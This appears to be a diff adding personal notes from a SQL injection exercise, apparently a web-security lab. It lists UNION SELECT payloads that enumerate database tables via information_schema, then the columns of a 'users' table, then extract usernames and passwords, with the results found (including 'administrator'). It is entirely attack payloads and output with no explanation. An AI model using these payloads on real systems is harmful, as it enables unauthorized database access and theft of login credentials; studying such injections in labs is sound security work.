@@ -1,0 +1,12 @@
+'union select NULL,table_name from information_schema.tables-- -
+
+users
+
+'union select NULL,column_name from information_schema.columns where table_name = 'users'-- -
+
+username
+password
+
+'union select NULL,username from users-- -
+administrator
+'union select NULL,password from users-- -
